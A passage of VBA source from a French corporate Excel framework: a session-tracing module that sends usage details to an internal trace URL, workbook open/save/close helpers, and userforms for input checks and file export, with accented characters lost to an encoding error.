        .FillAdjacentFormulas = False
        .PreserveFormatting = True
        .RefreshOnFileOpen = False
        .BackgroundQuery = True
        .RefreshStyle = xlInsertDeleteCells
        .SavePassword = False
        .SaveData = True
        .Refresh BackgroundQuery:=False
    End With
    
    'Tester le Retour "OK" en "A1" de "Temp"
    If VBA.UCase(WsData.Range("A1").Value) <> "OK" Then
        RunUrlTrace = False
    Else
        RunUrlTrace = True
    End If
      
    WsData.Cells.QueryTable.Delete
    Set Connection = Nothing
    'SupprimeNomsAvecJoker "*!Requete*", WsData
    WsData.Cells.Clear
    'Exit Function
    
ErrorHandler:
    On Error GoTo 0

'    If Err.Number <> 0 Then
'        Msg = "L'erreur # " & vba.str(Err.Number) & " a |fffd|t|fffd| g|fffd|n|fffd|r|fffd|e par " _
'             & Err.Source &vba.chr(13) & Err.Description
'        MsgBox Msg, vbCritical, APP_TITLE & " V" & APP_VERSION, Err.HelpFile, Err.HelpContext
'    End If
End Function


'-------------------------------------------------------------------------------------
'"nomAppli" CE PARAMETRE EST OBLIGATOIRE, il repr|fffd|sente le nom de l'application trac|fffd|e
'"typeLog" permet de pr|fffd|cisez s|fffd|il s|fffd|agit d|fffd|un Login (Entr|fffd|e) ou Logout (Sortie).
'Valeurs possibles : E pour une entr|fffd|e en session ou S pour une sortie de session.
'                    EF pour une entr|fffd|e de fonction ou SF pour une sortie de fonction.
'"attenteOut" permet de pr|fffd|cisez si une Logout (Sortie) sera trac|fffd| pour cette entr|fffd|e.
'Valeurs possibles : OUI une trace de sortie de session suivra, NON sinon
'Valeur par d|fffd|faut : NON
'Ignor|fffd| si le Type de Log vaut S ou SF
'"versAppli" CE PARAMETRE EST OBLIGATOIRE, Valeurs possibles : libre (15 caract|fffd|res Maximum)
'"domAppli" Domaine de l'application, Valeurs possibles : libre (15 caract|fffd|res Maximum)
'"ssDomAppli" Sous domaine de l'application, Valeurs possibles : libre (20 caract|fffd|res Maximum)
'"nomProgiciel" Nom du progiciel, Valeurs possibles : libre (30 caract|fffd|res Maximum)
'"versProgiciel" Version du progiciel, Valeurs possibles : libre (20 caract|fffd|res Maximum)
'"usr" Compte ou LogonId de l|fffd|utilisateur de l|fffd|application, Valeurs possibles : libre (20 caract|fffd|res Maximum), Valeur par d|fffd|faut : celui de l|fffd|utilisateur courant
'"nomUsr" Nom de l'utilisateur, Valeurs possibles : libre (30 caract|fffd|res Maximum)
'"noServiceUsr" Num|fffd|ro de service de l'utilisateur, Valeurs possibles : libre (7 caract|fffd|res Maximum)
'"nomServiceUsr" Nom de service de l'utilisateur, Valeurs possibles : libre (30 caract|fffd|res Maximum)
'"nomDirectUsr" Nom de la direction de l'utilisateur, Valeurs possibles : libre (30 caract|fffd|res Maximum)
'"nomSsDirectUsr" Nom de la sous direction de l'utilisateur, Valeurs possibles : libre (30 caract|fffd|res Maximum)
'"nomStation" Nom de la station ou de la machine, Valeurs possibles : libre (20 caract|fffd|res Maximum) Valeur par d|fffd|faut : le nom de la machine courante
'"ipStation" Adresse IP de la station ou de la machine, Valeurs possibles : libre (16 caract|fffd|res Maximum) Valeur par d|fffd|faut : le num|fffd|ro IP de la machine courante
'"typeStation" Type de la station ou de la machine, Valeurs possibles : libre (20 caract|fffd|res Maximum) Valeur par d|fffd|faut : PC
'="osStation" Syst|fffd|me d'exploitation de la machine, Valeurs possibles : libre (30 caract|fffd|res Maximum) Valeur par d|fffd|faut : le nom du syst|fffd|me de la machine courante
'"versionOsStation" Version du syst|fffd|me d'exploitation de la machine, Valeurs possibles : libre (30 caract|fffd|res Maximum), Valeur par d|fffd|faut : la version du syst|fffd|me de la machine courante
'"noServiceStation" Num|fffd|ro de service d'appartenance de la station ou de la machine, Valeurs possibles : libre (30 caract|fffd|res Maximum), Valeur par d|fffd|faut : la version du syst|fffd|me de la machine courante
'"nomServiceStation" Nom du service d'appartenance de la station ou de la machine, Valeurs possibles : libre (30 caract|fffd|res Maximum)
'"nomDirectStation" Nom de la direction d'appartenance de la station ou de la machine, Valeurs possibles : libre (30 caract|fffd|res Maximum) </param>
'"nomSsDirectStation" Nom de la sous-direction d'appartenance de la station ou de la machine, Valeurs possibles : libre (30 caract|fffd|res Maximum)</param>
'"divers" non utilis|fffd|
'"repertoire" R|fffd|pertoire o|fffd| se trouve le fichier de configuration permettant de modifier l'url de base
'nomFonction" Nom de la fonction, Valeurs possibles : libre (30 caract|fffd|res Maximum)
'"versFonction" Version de la fonction, Valeurs possibles : libre (15 caract|fffd|res Maximum)
'"critere1" Information d|fffd|crivant l|fffd|environnement de la session, Valeurs possibles : libre (35 caract|fffd|res Maximum)
'"critere2" Information d|fffd|crivant l|fffd|environnement de la session, Valeurs possibles : libre (35 caract|fffd|res Maximum)
'"profilUsr">Profil utilisateur de l'application, Valeurs possibles : libre (30 caract|fffd|res Maximum)
'"siteStation">API de la sation ou de la machine, Valeurs possibles : libre (25 caract|fffd|res Maximum)
'Les param|fffd|tres, non obligatoires, positionn|fffd| |fffd| nothing indique que la valeur par d|fffd|faut est prise en compte ou rien s'il n'y a pas de param|fffd|trage par d|fffd|faut.
Function ConstruitUrl(ByVal nomAppli As String, ByVal typeLog As String, ByVal attenteOut As String, ByVal versAppli As String, ByVal domAppli As String, ByVal ssDomAppli As String, ByVal nomProgiciel As String, _
    ByVal versProgiciel As String, ByVal usr As String, ByVal nomUsr As String, ByVal noServiceUsr As String, ByVal nomServiceUsr As String, ByVal nomDirectUsr As String, ByVal nomSsDirectUsr As String, _
    ByVal nomStation As String, ByVal ipStation As String, ByVal typeStation As String, ByVal osStation As String, ByVal versionOsStation As String, ByVal noServiceStation As String, ByVal nomServiceStation As String, _
    ByVal nomDirectStation As String, ByVal nomSsDirectStation As String, ByVal Divers As String, ByVal nomFonction As String, ByVal versFonction As String, ByVal critere1 As String, ByVal critere2 As String, _
    ByVal profilUsr As String, ByVal siteStation As String) As String

    Dim url_name As String
    Dim os_Station As String
    Dim T_Station As String
    Dim V_OS As String

    url_name = UrlTrace & "?nomAppli=" & RemplaceBlanc(nomAppli)
    url_name = url_name & "&domAppli=" & RemplaceBlanc(domAppli)

    If (typeLog <> "E" And typeLog <> "S" And typeLog <> "EF" And typeLog <> "SF") Then
        typeLog = "E"
        attenteOut = "NON"
    End If
    url_name = url_name & "&typeLog=" & typeLog

    If (typeLog = "S" Or typeLog = "SF") Then attenteOut = "NON"
    If attenteOut = vbNullString Then attenteOut = "NON"
    url_name = url_name & "&attenteOut=" & attenteOut
    url_name = url_name & "&dateHeure=" & DonneDateHeure

    If usr = vbNullString Then
        url_name = url_name & "&usr=" & VBA.Environ("USERNAME") 'Environment.UserName
    Else
        url_name = url_name & "&usr=" & usr
    End If

    os_Station = SystemCls.GetWindowsVersion(T_Station, V_OS)
    If osStation = vbNullString Then
        url_name = url_name & "&osStation=" & RemplaceBlanc(os_Station)
    Else
        url_name = url_name & "&osStation=" & RemplaceBlanc(osStation)
    End If

    If versionOsStation = vbNullString Then
        url_name = url_name & "&versionOsStation=" & RemplaceBlanc(V_OS)
    Else
        url_name = url_name & "&versionOsStation=" & RemplaceBlanc(versionOsStation)
    End If

    If ipStation = vbNullString Then
        url_name = url_name & "&ipStation=" & SystemCls.Get_Computer_IP 'GetIP
    Else
        url_name = url_name & "&ipStation=" & RemplaceBlanc(ipStation)
    End If

    If nomStation = vbNullString Then
        url_name = url_name & "&nomStation=" & SystemCls.Get_Computer_Name 'GetNomStation
    Else
        url_name = url_name & "&nomStation=" & RemplaceBlanc(nomStation)
    End If

    If Not versAppli = vbNullString Then url_name = url_name & "&versAppli=" & RemplaceBlanc(versAppli)
    If Not ssDomAppli = vbNullString Then url_name = url_name & "&ssDomAppli=" & RemplaceBlanc(ssDomAppli)
    If Not nomProgiciel = vbNullString Then url_name = url_name & "&nomProgiciel=" & RemplaceBlanc(nomProgiciel)
    If Not versProgiciel = vbNullString Then url_name = url_name & "&versProgiciel=" & RemplaceBlanc(versProgiciel)
    If Not nomUsr = vbNullString Then url_name = url_name & "&nomUsr=" & RemplaceBlanc(nomUsr)
    If Not noServiceUsr = vbNullString Then url_name = url_name & "&noServiceUsr=" & RemplaceBlanc(noServiceUsr)
    If Not nomServiceUsr = vbNullString Then url_name = url_name & "&nomServiceUsr=" & RemplaceBlanc(nomServiceUsr)
    If Not nomDirectUsr = vbNullString Then url_name = url_name & "&nomDirectUsr=" & RemplaceBlanc(nomDirectUsr)
    If Not nomSsDirectUsr = vbNullString Then url_name = url_name & "&nomSsDirectUsr=" & RemplaceBlanc(nomSsDirectUsr)
    If Not typeStation = vbNullString Then
        url_name = url_name & "&typeStation=" & RemplaceBlanc(T_Station)
    Else
        url_name = url_name & "&typeStation=" & "PC"
    End If
    If Not noServiceStation = vbNullString Then url_name = url_name & "&noServiceStation=" & RemplaceBlanc(noServiceStation)
    If Not nomServiceStation = vbNullString Then url_name = url_name & "&nomServiceStation=" & RemplaceBlanc(nomServiceStation)
    If Not nomDirectStation = vbNullString Then url_name = url_name & "&nomDirectStation=" & RemplaceBlanc(nomDirectStation)
    If Not Divers = vbNullString Then url_name = url_name & "&divers=" & RemplaceBlanc(Divers)
    If Not siteStation = vbNullString Then url_name = url_name & "&siteStation=" & RemplaceBlanc(siteStation)
    If Not profilUsr = vbNullString Then url_name = url_name & "&profilUsr=" & RemplaceBlanc(profilUsr)
    If Not critere1 = vbNullString Then url_name = url_name & "&critere1=" & RemplaceBlanc(critere1)
    If Not critere2 = vbNullString Then url_name = url_name & "&critere2=" & RemplaceBlanc(critere2)
    If Not nomFonction = vbNullString Then url_name = url_name & "&nomFonction=" & RemplaceBlanc(nomFonction)
    If Not versFonction = vbNullString Then url_name = url_name & "&versFonction=" & RemplaceBlanc(versFonction)
    
    ConstruitUrl = url_name
End Function


Function RemplaceBlanc(ByVal sValue As String) As String
    RemplaceBlanc = Replace(sValue, " ", "_")
End Function


Private Function DonneDateHeure() As String
    DonneDateHeure = VBA.Format(Now, "dd/MM/yyyy-HH:mm:ss")
End Function


Private Sub SaveUrl(ByVal urlNom As String)
    'La taille maximale du fichier de Log est fix|fffd|e |fffd| 1Mo soit environs 3600 traces
    Const MaxLogSize = &HF4240 'en Byte &HF4240 ou 1000000
    Dim FileCtrl  As Long
    Dim FilePath  As String
    
    On Error GoTo Fin
    FilePath = SystemCls.TempPathName
    
    If FilesCls.ExistFileInDir(FilePath, mcLogFile) Then
        If FileLen(FilePath & mcLogFile) > MaxLogSize Then Exit Sub
    End If
    
    FileCtrl = FreeFile
    Open FilePath & mcLogFile For Append As #FileCtrl
    Print #FileCtrl, urlNom
    Close #FileCtrl
Fin:
    On Error GoTo 0
End Sub


Private Sub PurgeSaveUrl()
    'Envoyer le stock de Traces
    Dim FileCtrl  As Long
    Dim FilePath  As String
    Dim mUrl      As String
    
    On Error GoTo 0 'Fin
    FilePath = SystemCls.TempPathName
    If FilesCls.ExistFileInDir(FilePath, mcLogFile) Then
        FileCtrl = FreeFile ' r|fffd|cup|fffd|re un num|fffd|ro de fichier libre.
        Open FilePath & mcLogFile For Input As #FileCtrl
        Do While Not EOF(FileCtrl)
            Input #FileCtrl, mUrl
            RunUrlTrace mUrl
        Loop
        Close #FileCtrl
        
        Kill FilePath & mcLogFile
    End If
Fin:
    On Error GoTo 0
End Sub
Attribute VB_Name = "WorkBooksClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 27/03/2006
'[Version       : V1.3 du 18/11/2009
'[---------------------------------------------------------------------------
'[Sujet: Classe biblioth|fffd|que de fonctions sur les classeurs
'[---------------------------------------------------------------------------


Option Explicit


'Ouverture d'un classeur Excel existant
Function Open_WorkBook(Sign As Boolean) As Boolean
    Dim TypesFiles As String, theTitle As String, pathUser As String, nameFileUser As String
    
    TypesFiles = IniCls.ReadStringIniLangage("MsgFile", "MsgFileXls")
    theTitle = IniCls.ReadStringIniLangage("MsgFWK", "MsgClasseur")
    
    'Affichage de la boite des fichiers avec arr|fffd|t si demand|fffd|
    If FilesCls.Openfiles(FilesCls.PathWorkBook(ThisWorkbook, True), TypesFiles, theTitle, pathUser, nameFileUser) Then
        'Ouverture du classeur s|fffd|lectionn|fffd|
        If OpenBook(pathUser, nameFileUser) Then
            If Sign Then WriteSignature ActiveWorkbook
            Open_WorkBook = True
        End If
    End If
End Function


'Signer un classeur produit par l'application, par son SIA et la Version de l'appli
'pour permettre une |fffd|ventuelle Mise |fffd| Niveau du classeur de donn|fffd|es lors d'une Mise |fffd| Jour de l'appli
Sub WriteSignature(wB As Workbook)
    wB.Title = APP_SIA & " - " & APP_VERSION
    wB.Subject = APP_TITLE
    wB.Author = APP_AUTEUR
    'wb.Comments = "Comments"
End Sub


'Function testant si une macro compl|fffd|mentaire est ouverte
'Function ProjetOuvert(Nomprojet)
'    ProjetOuvert = False
'    On Error Resume Next
'    For Each x In Application.VBE.VBProjects
'        NomComplet = x.filename
'        If vba.Instr(1, NomComplet, Nomprojet, 1) > 0 Then ProjetOuvert = True
'    Next x
'End Function

'Function testant si le classeur X est d|fffd|j|fffd| ouvert
Function BookAlreadyOpen(nameBook As String) As Boolean
    Dim passwordBook As Boolean

    'Test sur le mot de passe
    On Error Resume Next
    passwordBook = Workbooks(nameBook).HasPassword
    If err = 0 Then BookAlreadyOpen = True
    On Error GoTo 0
End Function


'Ferme les classeurs sauf ceux pass|fffd|s en param|fffd|tre
Sub CloseBooksExceptThem(nameBookOne As String, nameBookTwo As String, nameBookThree As String, wihtAskSave As Boolean)
    Dim nameBook() As String
    Dim nbBooks As Byte, CntLoop As Byte, CntLoopBis As Byte
    
    'Init
    nbBooks = Application.Workbooks.Count
    ReDim nameBook(nbBooks)

    'Boucle de fermeture
    For CntLoop = 1 To nbBooks
        If Not Workbooks(CntLoop).Name = nameBookOne And Not Workbooks(CntLoop).Name = nameBookTwo And Not Workbooks(CntLoop).Name = nameBookThree Then
            CntLoopBis = CntLoopBis + 1
            nameBook(CntLoopBis) = Workbooks(CntLoop).Name
        End If
    Next
    For CntLoop = 1 To CntLoopBis
        CloseWorkbook nameBook(CntLoop), wihtAskSave
    Next
End Sub


Sub CloseWorkbook(nameWorkBook As String, wihtAskSave As Boolean)
    Dim Reponse As Long

    Application.DisplayAlerts = False
    'Si la sauvegarde est demand|fffd|e et que le classeur a |fffd|t|fffd| modifi|fffd|
    If wihtAskSave And Not Workbooks(nameWorkBook).Saved Then
        Reponse = MsgCls.ShowMessage("MsgWorkBook", nameWorkBook, "MsgSave", vbNullString, vbYesNoCancel + vbQuestion)
        If Reponse = vbCancel Then
            Exit Sub
        ElseIf Reponse = vbYes Then
            WriteSignature Workbooks(nameWorkBook)
            If Workbooks(nameWorkBook).FullName = nameWorkBook Then 'Jamais sauvegard|fffd|
                Application.DisplayAlerts = True
                SaveWorkBook_As Workbooks(nameWorkBook), True
                Exit Sub
            Else
                Workbooks(nameWorkBook).Save
            End If
        End If
    End If
    'Fermeture
    Workbooks(nameWorkBook).Close
    Application.DisplayAlerts = True
End Sub


'Fonction retournant le nom du classeur de la macro appelante avec ou sans extension
Function WorkBookName(theBook As Workbook, withExtension As Boolean) As String
    Dim nbCaractPoint   As Integer

    'Obtention du nombre de caract|fffd|res |fffd| renvoyer
    nbCaractPoint = VBA.InStr(theBook.Name, ".") - 1

    'Si pas d'extension et si au moins un caract|fffd|re existe avant le point
    If nbCaractPoint > 0 And Not withExtension Then
        WorkBookName = VBA.Left(theBook.Name, nbCaractPoint)
    Else
        WorkBookName = theBook.Name
    End If
End Function


'Function retournant le nombre de feuilles d'un classeur
Function NbSheetsBook(nameBook As String)
    NbSheetsBook = Workbooks(nameBook).Sheets.Count
End Function


'Function ouvrant un classeur
Function OpenBook(ByVal pathFullBook As String, ByVal nameBook As String, Optional Read As Boolean = False, Optional Links As Variant = 0) As Boolean
    Dim pathComplet As String
    
    OpenBook = False
    'Si ce classeur n'est pas d|fffd|j|fffd| ouvert
    If Not BookAlreadyOpen(nameBook) Then
        'Essai de changement d'unit|fffd|
        On Error Resume Next
        ChDrive FilesCls.LetterDirBook(pathFullBook)
        If err <> 0 Then err = 0
 
        'Essai d'ouverture
        pathComplet = FilesCls.PathAndNameBookFromParam(pathFullBook, nameBook)
        Workbooks.Open Filename:=pathComplet, ReadOnly:=Read, UpdateLinks:=Links
        If err > 0 Then MsgCls.ShowMessage "MsgWorkBook", pathComplet, "MsgNotFound", vbNullString, vbOKOnly + vbCritical: Exit Function
        On Error GoTo 0
        
        OpenBook = True
    Else
        Application.Windows(nameBook).Activate
        
        'Si le Document est d|fffd|j|fffd| ouvert, confirmer la poursuite du traitement
        If MsgCls.ShowMessage("MsgWorkBook", nameBook, "MsgIsOpen", vbNullString, vbYesNo + vbQuestion) = vbYes Then OpenBook = True
    End If
End Function


'Function ouvrant un Mod|fffd|le de classeur
Function OpenModele(pathFullBook As String, nameBook As String) As Boolean
    Dim pathComplet As String
    
    OpenModele = False
    'Si ce classeur n'est pas d|fffd|j|fffd| ouvert
    If Not BookAlreadyOpen(nameBook) Then
        'Essai de changement d'unit|fffd|
        On Error Resume Next
            ChDrive FilesCls.LetterDirBook(pathFullBook)
        On Error GoTo 0
        If err <> 0 Then err = 0

        'Essai d'ouverture
        On Error Resume Next
            pathComplet = FilesCls.PathAndNameBookFromParam(pathFullBook, nameBook)
            Workbooks.Add Template:=pathComplet
        
            If err > 0 Then MsgCls.ShowMessage "MsgModele", pathComplet, "MsgNotFound", vbNullString, vbOKOnly + vbCritical: Exit Function
        On Error GoTo 0
        OpenModele = True
    Else
        'Si le Document est d|fffd|j|fffd| ouvert, confirmer la poursuite du traitement
        If MsgCls.ShowMessage("MsgModele", nameBook, "MsgIsOpen", vbNullString, vbYesNo + vbQuestion) = vbYes Then OpenModele = True
    End If
End Function


'Enregistrement d'un classeur
Function SaveWorkBook(theBook As Workbook, nameBook As String, pathFullBook As String, theFileFormat As Variant, closeIfEchec As Boolean) As Boolean
   
    'Imposition du separateur
    If Not VBA.Right(pathFullBook, 1) = Application.PathSeparator Then pathFullBook = pathFullBook & Application.PathSeparator

    'Essai de sauvegarde
    On Error Resume Next
        ChDrive FilesCls.LetterDirBook(pathFullBook)
        If err <> 0 Then err = 0
        WriteSignature theBook
        theBook.SaveAs Filename:=pathFullBook & nameBook, FileFormat:=theFileFormat, local:=True
        If err > 0 Then
            If closeIfEchec Then theBook.Close Else MsgCls.ShowMessage "MsgWorkBook", pathFullBook & nameBook, "MsgNotSave", vbNullString, vbOKOnly + vbCritical
            Exit Function
        End If
     On Error GoTo 0
     SaveWorkBook = True
End Function
 
 
Function SaveWorkBook_As(wB As Workbook, Optional saveAndQuit As Boolean = False) As Boolean
    'a faire
    'Classeur Microsoft Excel 5.0/95 (*.xls), *.xls),
    
    Dim TypesFiles As String, theTitle As String
    
    TypesFiles = IniCls.ReadStringIniLangage("MsgFile", "MsgFilesFormat")
    theTitle = IniCls.ReadStringIniLangage("MsgFWK", "MsgSaveAs")
    
    Dim pathComplet As String, nameFile As String, theFileFormat As Variant
    
    'Obtention du nom des fichiers ini
'    FilesCls.ObtainNameFilesIni nameFileIniMain, nameFileIniLangage
'
'    'Obtention du nom du sous r|fffd|pertoire contenant le fichier mod|fffd|le
'    If Not FilesCls.ReadStringIni("NameDirs", "NameDirFiles", NameSousDir, FilesCls.PathWorkBook(ThisWorkbook, True), nameFileIniLangage) Then PageAccueil.ShowWelcome
'
'    'Obtention du nom du fichier mod|fffd|le
'    If Not FilesCls.ReadStringIni("NameBooks", "NameDocumentModel", nameFileModel, FilesCls.PathWorkBook(ThisWorkbook, True), nameFileIniLangage) Then PageAccueil.ShowWelcome
'
'    'Ouverture
'    If Not WBooksCls.OpenBook(FilesCls.PathWorkBook(ThisWorkbook, True), nameFileModel) Then PageAccueil.ShowWelcome
    
    SaveWorkBook_As = False
    nameFile = wB.Name
    
    'Pseudo enregistrement
    If FilesCls.SaveFiles(APP_REP_PERSO, TypesFiles, theTitle, pathComplet, nameFile) Then
        If VBA.InStr(VBA.UCase(nameFile), ".XLS") <> 0 Then
            theFileFormat = xlNormal 'ou xlExcel5
        ElseIf VBA.InStr(VBA.UCase(nameFile), ".HTM") <> 0 Then
            theFileFormat = xlHtml
        ElseIf VBA.InStr(VBA.UCase(nameFile), ".CSV") <> 0 Then
            theFileFormat = xlCSV
        ElseIf VBA.InStr(VBA.UCase(nameFile), ".TXT") <> 0 Then
            theFileFormat = xlText
        ElseIf VBA.InStr(VBA.UCase(nameFile), ".MHT") <> 0 Then
            theFileFormat = xlWebArchive
        End If
    
        'Enregistrement
        WBooksCls.WriteSignature ActiveWorkbook
        'ActiveSheet.Unprotect 'Enlever toutes les protections du classeur
        If WBooksCls.SaveWorkBook(ActiveWorkbook, nameFile, pathComplet, theFileFormat, False) Then
            If saveAndQuit Then ActiveWorkbook.Close
            SaveWorkBook_As = True
        End If
    End If
End Function
       
       
'Ajouter des feuilles dans un classeur et les renommer
Sub AjouterRenommerFeuilles()
    Dim cpt As Integer
    cpt = 1
    Do While cpt < 4 ' Ajoute 3 feuilles
' Ajout d'une feuille
        Application.Sheets.Add after:=Sheets.Item(Sheets.Count), Type:=xlWorksheet
' Renomme la feuille
        Application.ActiveSheet.Name = "Semaine " & CStr(cpt)
        cpt = cpt + 1
    Loop
End Sub
 

'Enregistrer une copie du classeur
Sub SaveCopyAs()
    ActiveWorkbook.SaveCopyAs "C:\excel\MonDouble.xls"
End Sub
 

'Fermer tous les classeurs ouverts (sauf le classeur actif)
Sub FermeClasseurs()
    Dim wk As Workbook
    For Each wk In Workbooks
        If wk.Name <> ThisWorkbook.Name Then wk.Close savechanges:=True
    Next wk
End Sub

'Renommer les onglets d'un classeur
Sub RenommeOnglets()
' Renomme les onglets CL1, CL2, CL3, etc ...
    Dim i As Integer
    Application.ScreenUpdating = False
    For i = 1 To 3
       Worksheets(i).Name = "CL" & i
    Next i
End Sub


'Partage de classeurs
Private Sub Partager_Click()
    If ThisWorkbook.MultiUserEditing = True Then
        MsgBox "Ce fichier est d|fffd|j|fffd| partag|fffd|"
    End If

    ActiveWorkbook.ProtectSharing Filename:=ActiveWorkbook.Name
End Sub


Private Sub Util_Changements_Click()
    If ThisWorkbook.MultiUserEditing = False Then MsgBox "Ce fichier n'est pas partag|fffd|": Exit Sub

    With ActiveWorkbook
        .HighlightChangesOptions When:=xlAllChanges
        .HighlightChangesOnScreen = True
        .ListChangesOnNewSheet = True
    End With
End Sub


'==============================================================================================================
'================================================ Code Non Valid|fffd| =============================================
'==============================================================================================================
'Ecrire dans un fichier de type texte (date et heure).
'  Ce programme utilise les |fffd|v|fffd|nements WorkBook_Open et  Workbook_BeforeClose pour inscrire
'des informations dans un fichier de type texte lors de l'ouverture et de la fermeture d'Excel.
'dans l 'exemple, le fichier texte se nomme activite.log
'Private Sub Workbook_Open()
'Dim Donnees As Date
'      Dim LogFile As String
'      LogFile = "C:\Excel\activite.log"
'      ChDir "C:\Excel"
'      Donnees = Now()
'      Open LogFile For Append Shared As #1
'      Print #1, "Ouverture d'Excel a " & Donnees
'      Close #1
'End Sub

'Private Sub Workbook_BeforeClose(Cancel As Boolean)
'Dim Donnees As Date
'      Dim LogFile As String
'      LogFile = "C:\Excel\activite.log"
'      ChDir "C:\Excel"
'      Donnees = Now()
'      Open LogFile For Append Shared As #1
'      Print #1, "Fermeture d'Excel a " & Donnees
'      Print #1, "----------------------------------"
'      Close #1
'End Sub
Attribute VB_Name = "articles"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

Attribute VB_Name = "equipmt"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

Attribute VB_Name = "frmCtrlFormat"
Attribute VB_Base = "0{1FA538EB-C14D-4C6F-B5A4-E22A20E9A0F3}{6DA739B8-08C2-4DE4-AEE7-78AD0425ED55}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

'[---------------------------------------------------------------------------
'[Identifiant   : Controle Saisie TDI
'[Auteur        : Alain CHERMAT
'[Service       : DF - DPSI - Sce 65931
'[Date cr|fffd|ation : 19/01/2009
'[Version       : V1.0 du 19/01/2009
'[---------------------------------------------------------------------------
'[Sujet: Controle Saisie TDI
'[---------------------------------------------------------------------------

Option Explicit

'Pour r|fffd|cup|fffd|rer le handle de l'Userform
Private Declare Function FindWindowA Lib "user32" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long

Private Sub UserForm_Initialize()
    Select Case Mem_Controle_Format
        Case 1
            Me.optDecoupage.Value = True
        Case 2
            Me.optMateriels.Value = True
        Case 3
            Me.optDocuments.Value = True
        Case 4
            Me.optPiecesRechange.Value = True
        Case Else
            Me.optCtrlComplet.Value = True
    End Select
    
    Me.fraAnalyse.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgTypeCtrl")
    Me.lblCtrlPartiel.Caption = "- " & IniCls.ReadStringIniLangage("MsgFWK", "MsgRenum") & "," & vbCr & _
                                "- " & IniCls.ReadStringIniLangage("MsgFWK", "MsgCtrlFormat") & "," & vbCr & _
                                "- " & IniCls.ReadStringIniLangage("MsgFWK", "MsgCtrlOblig") & " :"
    Me.optDecoupage.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgOngDec")
    Me.optMateriels.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgOngMat")
    Me.optDocuments.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgOngDoc")
    Me.optPiecesRechange.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgOngPdr")
    Me.optCtrlComplet.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgCtrl&Liens") & "." & vbCr & _
                                IniCls.ReadStringIniLangage("MsgFWK", "MsgLongDelai")
End Sub

Private Sub TransparenceB(Valeur As Long)
    Dim MeHwnd As Long
    MeHwnd = FindWindowA(vbNullString, Me.Caption)
    'Valeur, correspond au pourcentage de transparence, 100 opaque et 0 on ne voit rien
    Call FormCls.Transparence(MeHwnd, Valeur)
End Sub

Private Sub btnCancel_Click()
    Unload Me
    End
End Sub

Private Sub btnOk_Click()
    If Me.optDecoupage.Value Then
        Mem_Controle_Format = 1
    ElseIf Me.optMateriels.Value Then
        Mem_Controle_Format = 2
    ElseIf Me.optDocuments.Value Then
        Mem_Controle_Format = 3
    ElseIf Me.optPiecesRechange.Value Then
        Mem_Controle_Format = 4
    ElseIf Me.optCtrlComplet.Value And Not Me.optPiecesRechange.Visible Then
        Mem_Controle_Format = 5 'Tous Controles sauf PR
    Else
        Mem_Controle_Format = 0 'Tous Controles avec PR
    End If
    Unload Me
End Sub
Attribute VB_Name = "frmExportRenom"
Attribute VB_Base = "0{D47F75DD-F4CA-4BB7-91DA-8342A0794596}{79FE1F68-CA61-4047-B5C9-8A3982916511}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub btngenerer_Click()
    
'Public Declare Function CreateThread Lib "kernel32" (lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
'Public Declare Function TerminateThread Lib "kernel32" (ByVal hThread As Long, ByVal dwExitCode As Long) As Long
'Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
 

'hThread = CreateThread(ByVal 0&, ByVal 0&, AddressOf GenerationFichiers, ByVal 0&, ByVal 0&, hThreadID)
'CloseHandle hThread 'ferme le handle
'Dim e As Long
'e = TerminateThread(hThread, 0) 'ferme le thread
    Application.ScreenUpdating = False
    Application.EnableEvents = False
    
    VerificatioNomFour
    
    Application.ScreenUpdating = True
    Application.EnableEvents = True
End Sub

Sub VerificatioNomFour()
    Dim i As Integer
    Dim err As Boolean

    err = False
    i = 4
    
    Do Until Sheets("Materiels").Cells(i, 1).Value = vbNullString
        If ThisWorkbook.Sheets("Materiels").Cells(i, 13).Value = vbNullString Then
            If ThisWorkbook.Sheets("Materiels").Cells(i, 7).Value = "B" Then
                If ThisWorkbook.Sheets("Materiels").Cells(i, 6).Value = "S" Or ThisWorkbook.Sheets("Materiels").Cells(i, 6).Value = "E" Then
                    ThisWorkbook.Sheets("Materiels").Cells(i, 13).Font.ColorIndex = 3
                    err = True
                End If
            End If
        End If
        i = i + 1
    Loop
    
    If err = False Then GenerationFichiers Else MsgBox "Le Nom d'integrateur n'est pas document|fffd| sur un ou plusieurs Enssemble/SSensemble.", vbCritical, "Manque d'information"

End Sub

Sub GenerationFichiers()
    Dim path As String
    
    On Error GoTo errGF
    
    If cmbPostes.Text = vbNullString Then
        cmbPostes.BackColor = vbRed
    Else
        cmbPostes.BackColor = vbWhite
        If cmbDossier.Text = vbNullString Then
            cmbDossier.BackColor = vbRed
        Else
            cmbDossier.BackColor = vbWhite
            If cmb_Doublons.Text = vbNullString Then
